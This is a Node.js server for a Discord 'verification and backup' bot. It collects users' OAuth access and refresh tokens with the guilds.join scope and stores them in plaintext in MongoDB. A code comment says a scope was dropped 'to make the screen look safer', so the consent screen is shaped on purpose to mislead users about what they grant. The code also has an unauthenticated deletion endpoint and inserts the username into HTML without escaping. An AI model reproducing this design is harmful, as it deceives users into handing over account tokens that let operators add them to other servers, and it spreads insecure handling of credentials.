require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();

/* ================================
    🛡️ MIDDLEWARE
================================ */
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const proxyUrl = process.env.PROXY_URL;
const proxyAgent = proxyUrl ? new HttpsProxyAgent(proxyUrl) : null;
const activeCallbacks = new Set();

/* ================================
    🟢 HOME ROUTE (Status Page)
================================ */
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
        <body style="background-color: #2c2f33; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
            <div style="text-align: center; border: 2px solid #5865F2; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
                <h1 style="color: #5865F2; margin-bottom: 10px;">🛡️ Member Shield</h1>
                <p style="font-size: 1.2em;">Status: <span style="color: #2ecc71; font-weight: bold;">ONLINE</span></p>
                <hr style="border: 0; border-top: 1px solid #4f545c; margin: 20px 0;">
                <small style="color: #b9bbbe;">Secure Verification & Backup System Active</small>
            </div>
        </body>
    `);
});

/* ================================
    1️⃣ DATABASE SCHEMAS
================================ */
const userSchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true },
    accessToken: String,
    refreshToken: String,
    username: String,
    guilds: [String],
    verifiedAt: { type: Date, default: Date.now }
});
const User = mongoose.models.User || mongoose.model('User', userSchema);

const serverSchema = new mongoose.Schema({
    guildId: { type: String, required: true, unique: true },
    verifyRoleId: String,
});
const ServerConfig = mongoose.models.ServerConfig || mongoose.model('ServerConfig', serverSchema);

/* ================================
    2️⃣ VERIFY ENDPOINT (Backup Priority)
================================ */
app.get('/verify', (req, res) => {
    const guildId = req.query.guild;
    if (!guildId) return res.send("<h2>Error</h2><p>Missing server ID.</p>");

    // guilds.join is KEPT for restoration powers
    // identify is KEPT for user data
    // bot is REMOVED to make the screen look safer
    const url = `https://discord.com/oauth2/authorize` +
        `?client_id=${process.env.CLIENT_ID}` +
        `&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}` +
        `&response_type=code` +
        `&scope=identify%20guilds.join` + 
        `&state=${guildId}`;

    res.redirect(url);
});

/* ================================
    3️⃣ CALLBACK (Auto-Role & Save)
================================ */
app.get('/callback', async (req, res) => {
    const { code, state } = req.query; 
    if (!code) return res.status(400).send("Missing authorization code.");

    if (activeCallbacks.has(code)) return res.status(429).send("Duplicate verification blocked.");
    activeCallbacks.add(code);

    try {
        const tokenRes = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                grant_type: 'authorization_code',
                code,
                redirect_uri: process.env.REDIRECT_URI
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, httpsAgent: proxyAgent, proxy: false }
        );

        const { access_token, refresh_token } = tokenRes.data;

        const userRes = await axios.get('https://discord.com/api/users/@me', { 
            headers: { Authorization: `Bearer ${access_token}` },
            httpsAgent: proxyAgent, proxy: false
        });

        const userId = userRes.data.id;

        // Save everything to MongoDB for restoration later
        await User.findOneAndUpdate(
            { userId: userId },
            {
                $set: {
                    accessToken: access_token,
                    refreshToken: refresh_token,
                    username: userRes.data.username,
                    verifiedAt: new Date()
                },
                $addToSet: { guilds: state }
            },
            { upsert: true }
        );

        // Assign Role
        try {
            const config = await ServerConfig.findOne({ guildId: state });
            if (config && config.verifyRoleId) {
                await axios.put(
                    `https://discord.com/api/v10/guilds/${state}/members/${userId}/roles/${config.verifyRoleId}`,
                    {},
                    { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}`, 'Content-Type': 'application/json' } }
                );
            }
        } catch (roleErr) {
            console.error("⚠️ Role Failed:", roleErr.response?.data || roleErr.message);
        }

        // Professional Success Page
        res.send(`
            <body style="background-color: #2c2f33; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
                <div style="text-align: center; border: 2px solid #2ecc71; padding: 20px; border-radius: 10px;">
                    <h1 style="color: #2ecc71;">🛡️ Verification Successful</h1>
                    <p>Thank you <b>${userRes.data.username}</b>, you are now verified.</p>
                    <p style="color: #b9bbbe; font-size: 0.9em;">You can close this window and return to Discord.</p>
                </div>
            </body>
        `);

    } catch (err) {
        console.error("❌ Error:", err.response?.data || err.message);
        res.status(500).send("Verification failed.");
    } finally {
        setTimeout(() => activeCallbacks.delete(code), 60_000);
    }
});

/* ================================
    4️⃣ 🧹 CLEANUP
================================ */
app.post('/cleanup-user', async (req, res) => {
    try {
        const userId = req.body.user_id;
        if (userId) {
            await User.findOneAndDelete({ userId: userId });
            console.log(`[🗑️ CLEANUP] User ${userId} wiped.`);
        }
        res.status(204).send();
    } catch (error) {
        res.status(500).send();
    }
});

/* ================================
    5️⃣ START
=============================== */
mongoose.connect(process.env.MONGO_URI)
    .then(() => {
        console.log("✅ MongoDB Connected");
        app.listen(process.env.PORT || 3000, () => console.log("🚀 Server LIVE"));
    })
    .catch(err => console.error("❌ MongoDB Error:", err));
